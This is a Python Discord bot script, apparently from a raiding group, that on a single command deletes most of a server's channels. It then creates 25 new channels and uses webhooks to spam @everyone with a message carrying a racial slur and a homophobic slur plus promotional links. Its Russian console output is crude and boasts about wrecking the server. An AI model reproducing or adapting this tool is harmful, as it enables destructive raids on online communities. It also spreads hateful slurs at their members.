import discord
import asyncio
from discord.ext import commands

token = input("чювак вводи токен: ")


intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'Бот {bot.user} запущен и готов к работе!')

@bot.command(name="moonik")
@commands.has_permissions(administrator=True)
async def moonik(ctx):
    guild = ctx.guild
    deleted_count = 0

    channels_to_delete = []
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            if channel.is_news():
                print(f'❌ Пропущен новостной канал: {channel.name}')
                continue
            if channel.name == "rules" or channel.name == "announcements":
                print(f'❌ Пропущен канал: {channel.name}')
                continue
            if channel.name.startswith("welcome") or channel.name.startswith("info"):
                print(f'❌ Пропущен приветственный/информационный канал: {channel.name}')
                continue

        channels_to_delete.append(channel)

    delete_tasks = [channel.delete() for channel in channels_to_delete]
    try:
        await asyncio.gather(*delete_tasks)
        deleted_count = len(delete_tasks)
    except discord.errors.HTTPException as e:
        print(f"❌ Ошибка при удалении канала: {e}")

    try:
        await ctx.author.send(f"снос {deleted_count} каналов. Создаю новые...")
    except discord.Forbidden:
        print("❌ Не удалось отправить сообщение в ЛС.")

    create_tasks = [guild.create_text_channel("moonsday") for _ in range(25)]
    new_channels = await asyncio.gather(*create_tasks)

    for channel in new_channels:
        try:
            webhook = await channel.create_webhook(name="dsq1488")
            
            await webhook.send("crash by [MoonsDay Client](https://dsc.gg/moonsday), @everyone niggers is pidors [Telegram](https://t.me/DSQ_squad)", username="dsq")
            
            await webhook.delete()
            
            print(f"✅ Вебхук создан и проспамлен! Сервер выебан в рот!")
        except discord.HTTPException as e:
            print(f"❌ Ошибка при работе с вебхуком в канале {channel.name}: {e}")

    print("✅ Новые каналы созданы а старые выебаны в рот!")

bot.run(token)
# bot by 
# hilmanzz [discord]
# MoonsDay Client - dsc.gg/moonsday
# DQS squad - t.me/DSQ_squad
# official GitHub - https://github.com/AloxinBay/DSQ_squad
